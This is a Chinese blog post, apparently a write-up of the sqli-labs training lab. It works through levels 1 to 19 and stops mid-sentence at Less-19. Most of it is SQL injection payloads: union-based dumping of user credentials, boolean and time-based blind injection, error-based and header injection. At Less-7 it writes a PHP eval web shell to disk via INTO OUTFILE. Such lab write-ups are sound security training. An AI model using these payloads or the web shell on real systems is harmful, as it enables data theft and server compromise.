@@ -1,0 +1,577 @@
+<!doctype html><html lang=en-us>
+<head><meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="之前很早写的，这几天把它补齐了。
+"><title>Sqli-lab速刷记录(1-53)</title>
+<link rel=canonical href=https://blog.zeddyu.info/2019/03/03/Sqli-lab%E9%80%9F%E5%88%B7%E8%AE%B0%E5%BD%951-53/>
+<link rel=stylesheet href=/scss/style.min.css><meta property="og:title" content="Sqli-lab速刷记录(1-53)">
+<meta property="og:description" content="之前很早写的，这几天把它补齐了。
+">
+<meta property="og:url" content="https://blog.zeddyu.info/2019/03/03/Sqli-lab%E9%80%9F%E5%88%B7%E8%AE%B0%E5%BD%951-53/">
+<meta property="og:site_name" content="Zeddy's Blog">
+<meta property="og:type" content="article"><meta property="article:section" content="Posts"><meta property="article:tag" content="Sec"><meta property="article:tag" content="sql注入"><meta property="article:published_time" content="2019-03-03T22:31:20+00:00"><meta property="article:modified_time" content="2019-03-03T22:31:20+00:00">
+<meta name=twitter:site content="@ZeddYu_Lu">
+<meta name=twitter:creator content="@ZeddYu_Lu"><meta name=twitter:title content="Sqli-lab速刷记录(1-53)">
+<meta name=twitter:description content="之前很早写的，这几天把它补齐了。
+">
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-112937997-1','auto'),ga('send','pageview'))</script>
+</head>
+<body class="article-page has-toc">
+<script>(function(){const a='StackColorScheme';localStorage.getItem(a)||localStorage.setItem(a,"auto")})()</script><script>(function(){const b='StackColorScheme',a=localStorage.getItem(b),c=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;a=='dark'||a==='auto'&&c?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script>
+<div class="container main-container flex
+extended">
+<div id=article-toolbar>
+<a href=https://blog.zeddyu.info class=back-home><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="15 6 9 12 15 18"/></svg>
+<span>Back</span>
+</a>
+</div>
+<main class="main full-width">
+<article class=main-article>
+<header class=article-header>
+<div class=article-details>
+<header class=article-category>
+<a href=/categories/Sec/ style=background-color:#0b0;color:#fff>
+Sec
+</a>
+</header>
+<h2 class=article-title>
+<a href=/2019/03/03/Sqli-lab%E9%80%9F%E5%88%B7%E8%AE%B0%E5%BD%951-53/>Sqli-lab速刷记录(1-53)</a>
+</h2>
+<footer class=article-time>
+<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>Mar 03, 2019</time>
+</div>
+<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>
+9 minute read
+</time>
+</div>
+</footer>
+</div>
+</header>
+<section class=article-content>
+<p>之前很早写的，这几天把它补齐了。</p>
+<p>[TOC]</p>
+<h2 id=preparation>Preparation</h2>
+<p>为了不干扰自己本机环境，sql-lab我就用的docker跑起来的，搭建也非常简单，也就两条命令</p>
+<pre tabindex=0><code>docker pull acgpiano/sqli-labs
+
+docker run -dt --name sqli-lab -p [你要映射的端口]:80 acgpiano/sqli-labs:latest
+</code></pre><p>然后在sql-lab上直接初始化数据库就好了。</p>
+<h2 id=basic>Basic</h2>
+<p>这里列举一下sql基础语句</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=k>show</span><span class=w> </span><span class=n>databases</span><span class=p>;</span><span class=w>         </span><span class=o>//</span><span class=err>查看数据库</span><span class=w>
+</span><span class=w>
+</span><span class=w></span><span class=n>use</span><span class=w> </span><span class=n>xxx</span><span class=p>;</span><span class=w>                </span><span class=o>//</span><span class=err>使用某个数据库</span><span class=w>
+</span><span class=w>
+</span><span class=w></span><span class=k>show</span><span class=w> </span><span class=n>tables</span><span class=p>;</span><span class=w>            </span><span class=o>//</span><span class=err>查看该数据库的数据表</span><span class=w>
+</span><span class=w>
+</span><span class=w></span><span class=k>desc</span><span class=w> </span><span class=n>xxx</span><span class=p>;</span><span class=w>               </span><span class=o>//</span><span class=err>查看该数据表的结构</span><span class=w>
+</span><span class=w>
+</span><span class=w></span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>xxx</span><span class=p>;</span><span class=w>      </span><span class=o>//</span><span class=err>查找某个数据表的所有内容</span><span class=w>
+</span><span class=w>
+</span><span class=w></span><span class=k>select</span><span class=w> </span><span class=k>schema_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>schemata</span><span class=p>;</span><span class=w>        </span><span class=o>//</span><span class=err>猜数据库</span><span class=w>
+</span><span class=w>
+</span><span class=w></span><span class=k>select</span><span class=w> </span><span class=k>table_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>table_schema</span><span class=o>=</span><span class=s1>&#39;xxxxx&#39;</span><span class=p>;</span><span class=w>                                </span><span class=o>//</span><span class=err>猜某数据库的数据表</span><span class=w>
+</span><span class=w>
+</span><span class=w></span><span class=k>Select</span><span class=w> </span><span class=k>column_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>columns</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=k>table_name</span><span class=o>=</span><span class=s1>&#39;xxxxx&#39;</span><span class=p>;</span><span class=w>                                </span><span class=o>//</span><span class=err>猜某表的所有列</span><span class=w>
+</span><span class=w>
+</span><span class=w></span><span class=k>left</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>b</span><span class=p>)</span><span class=w>       </span><span class=o>//</span><span class=err>从左侧截取</span><span class=w> </span><span class=n>a</span><span class=w> </span><span class=err>的前</span><span class=w> </span><span class=n>b</span><span class=w> </span><span class=err>位</span><span class=w>
+</span><span class=w>
+</span><span class=w></span><span class=n>mid</span><span class=p>(</span><span class=k>column_name</span><span class=p>,</span><span class=k>start</span><span class=p>[,</span><span class=k>length</span><span class=p>])</span><span class=w>     </span><span class=o>//</span><span class=err>从位置</span><span class=n>start开始</span><span class=err>，截取</span><span class=n>column_name字符串的length位</span><span class=err>，与</span><span class=n>substr作用相同</span><span class=w>
+</span><span class=w>
+</span><span class=w></span><span class=n>substr</span><span class=p>(</span><span class=n>string</span><span class=p>,</span><span class=w> </span><span class=k>start</span><span class=p>,</span><span class=w> </span><span class=k>length</span><span class=p>)</span><span class=w>       </span><span class=o>//</span><span class=err>从位置</span><span class=n>start开始</span><span class=err>，截取字符串</span><span class=n>string的length长度</span><span class=err>，与</span><span class=n>mid作用相同</span><span class=w>
+</span><span class=w>
+</span><span class=w></span><span class=n>ascii</span><span class=p>()</span><span class=w>         </span><span class=o>//</span><span class=err>将某个字符转换成</span><span class=n>ascii码</span><span class=w>
+</span><span class=w>
+</span><span class=w></span><span class=n>ord</span><span class=p>()</span><span class=w>           </span><span class=o>//</span><span class=err>将某个字符转换成</span><span class=n>ascii码</span><span class=err>，同</span><span class=n>ascii</span><span class=p>()</span><span class=w>
+</span></code></pre></div><h2 id=sqli-labs-page-1basic-challenges>SQLi-LABS Page-1(Basic Challenges)</h2>
+<h3 id=less-1>Less-1</h3>
+<p>尝试添加&rsquo;注入，发现报错</p>
+<pre tabindex=0><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
+</code></pre><p>这里我们就可以直接发现报错的地方，直接将后面注释，然后使用</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=mi>1</span><span class=s1>&#39; order by 3%23    //得到列数为3
+</span><span class=s1>
+</span><span class=s1>//这里用-1是为了查询一个不存在的id,好让第一句结果为空，直接显示第二句的结果
+</span><span class=s1>-1&#39;</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=n>group_concat</span><span class=p>(</span><span class=k>schema_name</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>schemata</span><span class=o>%</span><span class=mi>23</span><span class=w>  </span><span class=o>//</span><span class=err>得到数据库名</span><span class=w>
+</span><span class=w>
+</span><span class=w></span><span class=o>-</span><span class=mi>1</span><span class=s1>&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= &#39;</span><span class=k>security</span><span class=s1>&#39;#    //得到表名
+</span><span class=s1>
+</span><span class=s1>-1&#39;</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=n>group_concat</span><span class=p>(</span><span class=k>column_name</span><span class=p>),</span><span class=mi>3</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>columns</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=k>table_name</span><span class=o>=</span><span class=w> </span><span class=s1>&#39;users&#39;</span><span class=o>#</span><span class=w>   </span><span class=o>//</span><span class=err>得到列名</span><span class=w>
+</span><span class=w>
+</span><span class=w></span><span class=o>-</span><span class=mi>1</span><span class=s1>&#39; union select 1,username,password from users where id=3#     //爆破得到数据
+</span></code></pre></div><h3 id=less-2>Less-2</h3>
+<p>在添加&rsquo;之后，得到返回</p>
+<pre tabindex=0><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1
+</code></pre><p>可以得到这个sql语句其实并没有单引号，只是用数字进行查询，例如</p>
+<pre tabindex=0><code>select * from users where id=1
+</code></pre><p>所以我们也可以跟上面一样，payloads:</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=o>-</span><span class=mi>1</span><span class=w> </span><span class=k>or</span><span class=w> </span><span class=mi>1</span><span class=o>=</span><span class=mi>1</span><span class=o>%</span><span class=mi>23</span><span class=w>
+</span></code></pre></div><h3 id=less-3>Less-3</h3>
+<p>添加&rsquo;之后，返回</p>
+<pre tabindex=0><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1
+</code></pre><p>可以得到大概的sql语句:</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>id</span><span class=o>=</span><span class=p>(</span><span class=s1>&#39;input&#39;</span><span class=p>)</span><span class=w> </span><span class=k>LIMIT</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>;</span><span class=w>
+</span></code></pre></div><p>所以我们可以需要闭合)。</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=o>-</span><span class=mi>1</span><span class=s1>&#39;) or 1=1%23
+</span></code></pre></div><h3 id=less-4>Less-4</h3>
+<p>尝试&rsquo;并未发现报错，尝试"发现报错</p>
+<pre tabindex=0><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&quot;1&quot;&quot;) LIMIT 0,1' at line 1 
+</code></pre><p>可以得到大概的sql语句</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=s2>&#34;input&#34;</span><span class=p>)</span><span class=w> </span><span class=k>LIMIT</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>;</span><span class=w>
+</span></code></pre></div><p>所以payload:</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=o>-</span><span class=mi>1</span><span class=s2>&#34;) or 1=1 %23
+</span></code></pre></div><p>其他注入语句同上 ，就不再一一列举了。</p>
+<h3 id=less-5>Less-5</h3>
+<p>尝试&rsquo;发现报错</p>
+<pre tabindex=0><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
+</code></pre><p>猜测sql语句为</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>id</span><span class=o>=</span><span class=s1>&#39;input&#39;</span><span class=w> </span><span class=k>LIMIT</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>;</span><span class=w>
+</span></code></pre></div><p>如果尝试之前的注入方法，会发现不再会返回我们注入的信息，如果注入成功的话，页面会返回<code>You are in...</code>，出错的话就不会返回这个字符串，所以这里我们可以进行盲注。</p>
+<h4 id=使用left>使用left()</h4>
+<p>例如我们可以使用<code>1' and left(version(),1)=3%23</code>这个payload进行测试，截取<code>version()</code>得到的最左侧的字符判断是否为3，如果为3则正常返回<code>You are in...</code>，否则不返回。所以我们可以利用这个一步一步爆破得到<code>left(version(),1)=5</code>。爆破区间可以确定在<code>/[0-9.]/</code>。</p>
+<p>采用<code>1'and length(database())=8%23</code>对数据库名字长度进行爆破，确定数据库名字长度之后，我们可以使用<code>database()</code>来进行爆破数据库名，采用<code>left(database(),1)>'a'</code>这个payload进行测试，原理跟上述一致，看返回即可，直到截取长度与数据库名字一致为止，这里效率比较高的就是采用二分法进行盲注。</p>
+<h4 id=使用substrascii>使用substr()、ascii()</h4>
+<p>也可以采用substr()、ascii()函数进行尝试:</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=mi>1</span><span class=s1>&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;80%23     //截取数据库下第一个表的第一个字符与80ascii值进行对比
+</span><span class=s1>
+</span><span class=s1>找第二个字符只需要改成substr(&#39;</span><span class=n>xxx</span><span class=s1>&#39;,2,1)即可。
+</span><span class=s1>找第二个表改成limit 1,1
+</span></code></pre></div><h4 id=使用regexp>使用regexp()</h4>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=mi>1</span><span class=s1>&#39; and 1=(select 1 from information_schema.columns where table_name=&#39;</span><span class=n>users</span><span class=s1>&#39; and column_name regexp &#39;</span><span class=o>^</span><span class=n>us</span><span class=p>[</span><span class=n>a</span><span class=o>-</span><span class=n>z</span><span class=p>]</span><span class=s1>&#39; limit 0,1;)%23
+</span><span class=s1>//users表中的列名是否有us**的列
+</span></code></pre></div><h4 id=使用ordmid>使用ord()、mid()</h4>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=mi>1</span><span class=s1>&#39; and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))= 68%23
+</span><span class=s1>//cast(username AS CHAR)将username转换成字符串
+</span><span class=s1>//IFNULL(exp1,exp2)假如expr1不为NULL，则IFNULL()的返回值为expr1; 否则其返回值为expr2。IFNULL()的返回值是数字或是字符串，具体情况取决于其所使用的语境。
+</span><span class=s1>//ord前文提过
+</span></code></pre></div><h4 id=使用报错注入>使用报错注入</h4>
+<p>推荐一篇超详细的讲解报错注入的文章——<a class=link href=https://www.cnblogs.com/xdans/p/5412468.html target=_blank rel=noopener>Mysql报错注入原理分析(count()、rand()、group by)</a></p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=mi>1</span><span class=s1>&#39; union Select 1,count(*),concat(0x3a,0x3a,(select user()),0
+</span><span class=s1>x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+
+</span><span class=s1>
+</span><span class=s1>1&#39;</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=k>count</span><span class=p>(</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=p>,</span><span class=n>concat</span><span class=p>((</span><span class=k>select</span><span class=w> </span><span class=k>user</span><span class=p>()),</span><span class=n>floor</span><span class=p>(</span><span class=n>rand</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=p>))</span><span class=n>x</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>security</span><span class=p>.</span><span class=n>users</span><span class=w> </span><span class=k>group</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=n>x</span><span class=o>#</span><span class=w>
+</span><span class=w>
+</span><span class=w></span><span class=mi>1</span><span class=s1>&#39; union select (!(select * from (select user())x) - ~0),2,3 --+
+</span><span class=s1>
+</span><span class=s1>1&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>extractvalue</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=o>@@</span><span class=k>version</span><span class=p>),</span><span class=mi>0</span><span class=n>x7e</span><span class=p>))</span><span class=w> </span><span class=c1>--+
+</span><span class=c1></span><span class=w>
+</span><span class=w></span><span class=mi>1</span><span class=s1>&#39; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) --+
+</span><span class=s1>
+</span><span class=s1>1&#39;</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>3</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=n>NAME_CONST</span><span class=p>(</span><span class=k>version</span><span class=p>(),</span><span class=mi>1</span><span class=p>),</span><span class=w> </span><span class=n>NAME_CONST</span><span class=p>(</span><span class=k>version</span><span class=p>(),</span><span class=mi>1</span><span class=p>))</span><span class=n>x</span><span class=w> </span><span class=c1>--+
+</span></code></pre></div><h4 id=使用延时注入>使用延时注入</h4>
+<p>benchmark 是Mysql的一个内置函数,其作用是来测试一些函数的执行速度。 benchmark() 中带有两个参数，第一个是执行的次数，第二个是要执行的函数或者是表达式</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=mi>1</span><span class=s1>&#39;and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+
+</span><span class=s1>
+</span><span class=s1>1&#39;</span><span class=k>UNION</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=p>(</span><span class=k>IF</span><span class=p>(</span><span class=k>SUBSTRING</span><span class=p>(</span><span class=k>current</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=p>)</span><span class=o>=</span><span class=nb>CHAR</span><span class=p>(</span><span class=mi>115</span><span class=p>),</span><span class=n>BENCHMARK</span><span class=p>(</span><span class=mi>50000000</span><span class=p>,</span><span class=n>ENCODE</span><span class=p>(</span><span class=s1>&#39;MSG&#39;</span><span class=p>,</span><span class=s1>&#39;by 5 seconds&#39;</span><span class=p>)),</span><span class=k>null</span><span class=p>)),</span><span class=mi>2</span><span class=p>,</span><span class=mi>3</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=k>database</span><span class=p>()</span><span class=w> </span><span class=k>as</span><span class=w> </span><span class=k>current</span><span class=p>)</span><span class=w> </span><span class=k>as</span><span class=w> </span><span class=n>tb1</span><span class=c1>--+
+</span></code></pre></div><h3 id=less-6>Less-6</h3>
+<p>没有回显，可以使用布尔盲注</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=mi>1</span><span class=s2>&#34; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100--+
+</span></code></pre></div><p>可以发现<code>>100</code>有回显，小于就没有，也可以用报错注入…</p>
+<p>这里就是把Less-5 中的<code>'</code>改成<code>"</code>就行了</p>
+<h3 id=less-7>Less-7</h3>
+<p>使用文件导出</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=mi>1</span><span class=s1>&#39;))UNION SELECT 1,2,3 into outfile &#34;c:\\wamp\\www\\sqlli b\\Less-7\\uuu.txt&#34;%23
+</span><span class=s1>
+</span><span class=s1>1&#39;</span><span class=p>))</span><span class=k>UNION</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=s1>&#39;&lt;?php @eval($_post[“mima”])?&gt;&#39;</span><span class=w> </span><span class=k>into</span><span class=w> </span><span class=n>outfile</span><span class=w> </span><span class=s2>&#34;c:\\wamp\\www\\sqllib\\Less-7\\yijuhua.php&#34;</span><span class=c1>--+
+</span></code></pre></div><h3 id=less-8>Less-8</h3>
+<p>可以使用时间盲注，也可以用 bool 盲注</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=mi>1</span><span class=s1>&#39; and If(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+
+</span></code></pre></div><h3 id=less-9>Less-9</h3>
+<p>同 Less-8 可以使用时间盲注</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=mi>1</span><span class=s1>&#39; and If(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+
+</span></code></pre></div><h3 id=less-10>Less-10</h3>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=mi>1</span><span class=s2>&#34; and If(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+
+</span></code></pre></div><h3 id=less-11>Less-11</h3>
+<p>报错注入，少一列就行了</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=mi>1</span><span class=s1>&#39; union Select count(*),concat(0x3a,0x3a,(select group_concat(schema_name) from information_schema.schemata),0x3a,0x3a,floor(rand(0)*2))a from information_schema.schemata group by a#
+</span><span class=s1>
+</span><span class=s1>1&#39;</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=o>*</span><span class=p>),</span><span class=n>concat</span><span class=p>((</span><span class=k>select</span><span class=w> </span><span class=k>user</span><span class=p>()),</span><span class=n>floor</span><span class=p>(</span><span class=n>rand</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=p>))</span><span class=n>x</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>columns</span><span class=w> </span><span class=k>group</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=n>x</span><span class=o>#</span><span class=w>
+</span></code></pre></div><h3 id=less-12>Less-12</h3>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=mi>1</span><span class=s2>&#34;) union Select count(*),concat(0x3a,0x3a,(select group_concat(schema_name) from information_schema.schemata),0x3a,0x3a,floor(rand(0)*2))a from information_schema.schemata group by a#
+</span><span class=s2>
+</span><span class=s2>1&#34;</span><span class=p>)</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=o>*</span><span class=p>),</span><span class=n>concat</span><span class=p>((</span><span class=k>select</span><span class=w> </span><span class=k>user</span><span class=p>()),</span><span class=n>floor</span><span class=p>(</span><span class=n>rand</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=p>))</span><span class=n>x</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>columns</span><span class=w> </span><span class=k>group</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=n>x</span><span class=o>#</span><span class=w>
+</span></code></pre></div><h3 id=less-13>Less-13</h3>
+<pre tabindex=0><code>1') or 1=1#
+</code></pre><p>成功登录，报错注入成功但是不回显，可以考虑盲注</p>
+<pre tabindex=0><code>1') or ascii(substr((database()),1,1))&gt;100#
+</code></pre><h3 id=less-14>Less-14</h3>
+<pre tabindex=0><code>1&quot; or 1=1#
+</code></pre><p>成功登录，依然不能回显，尝试使用布尔盲注</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=mi>1</span><span class=s2>&#34; or left(database(),1)=&#39;s&#39;#
+</span></code></pre></div><p>发现可以用<code>updatexml</code>进行报错注入</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=mi>1</span><span class=s2>&#34; and updatexml(1,concat(0x7e,(select @@version),0x7e),1)#
+</span></code></pre></div><h3 id=less-15>Less-15</h3>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=mi>1</span><span class=s1>&#39; or 1=1#
+</span></code></pre></div><p>成功登录，布尔注入或者时间盲注均可行</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=mi>1</span><span class=s1>&#39; or left(database(),1)=&#39;</span><span class=n>s</span><span class=s1>&#39;#
+</span><span class=s1>admin&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>If</span><span class=p>(</span><span class=n>ascii</span><span class=p>(</span><span class=n>substr</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=p>))</span><span class=o>&gt;</span><span class=mi>115</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=n>sleep</span><span class=p>(</span><span class=mi>5</span><span class=p>))</span><span class=o>#</span><span class=w>
+</span></code></pre></div><h3 id=less-16>Less-16</h3>
+<pre tabindex=0><code>1&quot;) or 1=1#
+</code></pre><p>成功登录，布尔注入或者时间盲注均可行</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=mi>1</span><span class=s2>&#34;) or left(database(),1)=&#39;s&#39;#
+</span><span class=s2>admin&#34;</span><span class=p>)</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>If</span><span class=p>(</span><span class=n>ascii</span><span class=p>(</span><span class=n>substr</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=p>))</span><span class=o>&gt;</span><span class=mi>115</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=n>sleep</span><span class=p>(</span><span class=mi>5</span><span class=p>))</span><span class=o>#</span><span class=w>
+</span></code></pre></div><h3 id=less-17>Less-17</h3>
+<p><code>update</code>注入，<code>username</code>过滤了很多，有<code>password</code>错误回显，考虑用报错注入</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=mi>1</span><span class=s1>&#39; and updatexml(1,concat(0x7e,(select @@version),0x7e),1)#
+</span></code></pre></div><h3 id=less-18>Less-18</h3>
+<p>登录成功后，页面提示</p>
+<pre tabindex=0><code>Your IP ADDRESS is: 172.17.0.1
+Your User Agent is: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0
+</code></pre><p>那么有可能是 ip 或者 UA 注入，看了一下发现是个 Header 头注入，这里需要注意这是登录成功的条件下才能触发的，而且既然是<code>insert</code>注入，需要用<code>'1'='1</code>闭合后面的 sql 语句，否则就是语法错误了</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=s1>&#39; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) and &#39;</span><span class=mi>1</span><span class=s1>&#39;=&#39;</span><span class=mi>1</span><span class=w>
+</span><span class=w></span><span class=s1>&#39; and updatexml(1,concat(0x7e,(select @@version),0x7e),1),&#34;1&#34;,&#34;1&#34;)#
+</span></code></pre></div><h3 id=less-19>Less-19</h3>
+<p>登录成功后提示</p>
+<pre tabindex=0><code>Your IP ADDRESS is: 172.17.0.1
+Your Referer is: http://localhost:8081/Less-19/
+</code></pre><p>于是我们可以知道是在<code>Referer</code>应该有注入点，在 Referer 处同样用</p>
